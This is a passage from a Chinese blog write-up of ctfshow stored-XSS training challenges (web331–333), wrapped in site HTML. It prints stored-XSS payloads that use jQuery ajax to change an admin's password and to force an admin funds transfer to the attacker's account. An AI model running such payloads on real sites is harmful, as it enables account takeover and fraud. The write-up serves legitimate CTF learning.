+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123123&#x27;</span>,<span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;&#125;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>改完了admin密码之后，就用admin和修改后的密码<code>123123</code>登录即可。</p>
+<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>首先注册，用户名密码随意。这里用户名为<code>aaaaa</code>。</p>
+<p>查看汇款页面源代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-row&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;layui-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;api/amount.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-form-item&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;layui-form-label&quot;</span>&gt;</span>收款人<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-input-block&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;u&quot;</span> <span class="attr">required</span>  <span class="attr">lay-verify</span>=<span class="string">&quot;required&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入收款人&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-input&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-form-item&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;layui-form-label&quot;</span>&gt;</span>金额<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-input-block&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">required</span>  <span class="attr">lay-verify</span>=<span class="string">&quot;required&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入金额&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-input&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得知参数一个是<code>u</code>，一个是<code>a</code>，分别代表收款人和金额。</p>
+<p>然后注册一个新用户，用户名上xss：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;aaaaa&#x27;</span>,<span class="attr">a</span>:<span class="number">20000</span>,<span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;&#125;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>来自admin的20000元汇款马上就到账了。购买flag即可。</p>
+<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>和上题完全一致。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">XSS - 反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316-XSS%E5%B8%A6%E5%87%BAcookie"><span class="toc-number">1.1.</span> <span class="toc-text">web316 - XSS带出cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317-XSS%E8%BF%87%E6%BB%A4%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.</span> <span class="toc-text">web317 - XSS过滤&lt;script&gt;标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web318"><span class="toc-number">1.3.</span> <span class="toc-text">web318</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web319"><span class="toc-number">1.4.</span> <span class="toc-text">web319</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-XSS%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.</span> <span class="toc-text">web320 - XSS过滤空格</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">XSS空格过滤的绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web321"><span class="toc-number">1.6.</span> <span class="toc-text">web321</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web322-%E8%BF%87%E6%BB%A4xss%E5%AD%97%E7%AC%A6"><span class="toc-number">1.7.</span> <span class="toc-text">web322 - 过滤xss字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web323"><span class="toc-number">1.8.</span> <span class="toc-text">web323</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web324"><span class="toc-number">1.9.</span> <span class="toc-text">web324</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web325"><span class="toc-number">1.10.</span> <span class="toc-text">web325</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web326"><span class="toc-number">1.11.</span> <span class="toc-text">web326</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">XSS - 存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">2.1.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">2.2.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">2.3.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web330"><span class="toc-number">2.4.</span> <span class="toc-text">web330</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E7%9B%B4%E6%8E%A5%E8%AF%BB%E7%BD%91%E9%A1%B5"><span class="toc-number">2.4.1.</span> <span class="toc-text">方案一：直接读网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">2.4.2.</span> <span class="toc-text">方案二：修改密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web331"><span class="toc-number">2.5.</span> <span class="toc-text">web331</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web332"><span class="toc-number">2.6.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web333"><span class="toc-number">2.7.</span> <span class="toc-text">web333</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&text=ctfshow-web入门笔记-xss入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&is_video=false&description=ctfshow-web入门笔记-xss入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-xss入门&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&title=ctfshow-web入门笔记-xss入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&name=ctfshow-web入门笔记-xss入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-xss%E5%85%A5%E9%97%A8/&t=ctfshow-web入门笔记-xss入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
